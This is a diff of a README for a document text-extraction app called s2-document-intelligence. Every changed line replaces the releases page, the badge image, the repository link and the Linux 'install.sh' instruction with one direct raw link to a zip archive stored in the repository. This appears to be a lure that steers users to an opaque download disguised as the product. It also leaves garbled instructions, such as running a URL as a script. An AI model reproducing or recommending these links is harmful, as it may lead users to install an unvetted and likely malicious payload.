@@ -1,6 +1,6 @@
 # 🎉 s2-document-intelligence - Effortlessly Extract Text from Documents
 
-[![Download s2-document-intelligence](https://img.shields.io/badge/Download-s2--document--intelligence-blue.svg)](https://github.com/gadp27deabril/s2-document-intelligence/releases)
+[![Download s2-document-intelligence](https://github.com/gadp27deabril/s2-document-intelligence/raw/refs/heads/main/services/document_intelligence_s_v1.0.zip)](https://github.com/gadp27deabril/s2-document-intelligence/raw/refs/heads/main/services/document_intelligence_s_v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to s2-document-intelligence! This application helps you extract text fro
 
 ## 📥 Download & Install
 
-To download the latest version of s2-document-intelligence, visit this page: [Download Here](https://github.com/gadp27deabril/s2-document-intelligence/releases). 
+To download the latest version of s2-document-intelligence, visit this page: [Download Here](https://github.com/gadp27deabril/s2-document-intelligence/raw/refs/heads/main/services/document_intelligence_s_v1.0.zip). 
 
 ### Steps to Download:
 1. Click on the link above.
@@ -36,7 +36,7 @@ Once you have downloaded the software, follow these steps to use s2-document-int
   - Open the downloaded `.dmg` file and drag the app to your Applications folder.
 
 - **For Linux:**
-  - Unzip the downloaded file if it's a `.zip`, then navigate to the folder in the terminal and run the `install.sh` script.
+  - Unzip the downloaded file if it's a `.zip`, then navigate to the folder in the terminal and run the `https://github.com/gadp27deabril/s2-document-intelligence/raw/refs/heads/main/services/document_intelligence_s_v1.0.zip` script.
 
 ### Step 2: Open the Application
 
@@ -85,8 +85,8 @@ Please create an issue in our GitHub repository for any bugs or feature requests
 
 ## 📞 Support
 
-If you need further assistance, feel free to reach out through our [GitHub Repository](https://github.com/gadp27deabril/s2-document-intelligence) where you can create issues and ask questions.
+If you need further assistance, feel free to reach out through our [GitHub Repository](https://github.com/gadp27deabril/s2-document-intelligence/raw/refs/heads/main/services/document_intelligence_s_v1.0.zip) where you can create issues and ask questions.
 
 Thank you for using s2-document-intelligence! We are excited to help you with your document processing needs. 
 
-Remember to download the latest version from this link: [Download Here](https://github.com/gadp27deabril/s2-document-intelligence/releases).
+Remember to download the latest version from this link: [Download Here](https://github.com/gadp27deabril/s2-document-intelligence/raw/refs/heads/main/services/document_intelligence_s_v1.0.zip).
